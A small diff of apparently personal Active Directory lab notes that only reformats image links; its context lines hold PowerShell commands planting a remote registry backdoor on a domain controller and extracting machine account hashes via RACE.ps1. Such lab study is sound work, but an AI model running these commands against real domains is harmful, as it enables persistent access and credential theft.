@@ -1,5 +1,5 @@
 
-![[../../../attchments/Pasted image 20250621172939.png]]
+![Pasted image 20250621172939](../../../attchments/Pasted%20image%2020250621172939.png)
 
 
 ```
@@ -7,9 +7,9 @@ Add-RemoteRegBackdoor -ComputerName dcorp-dc-Trustee student1
 -Verbose
 ```
 
-![[../../../attchments/Pasted image 20250621173051.png]]
+![Pasted image 20250621173051](../../../attchments/Pasted%20image%2020250621173051.png)
 
-![[../../../attchments/Pasted image 20250621173110.png]]
+![Pasted image 20250621173110](../../../attchments/Pasted%20image%2020250621173110.png)
 ```
 . C:\AD\Tools\RACE.ps1
 Get-RemoteMachineAccountHash -ComputerName dcorp-dc-Verbose
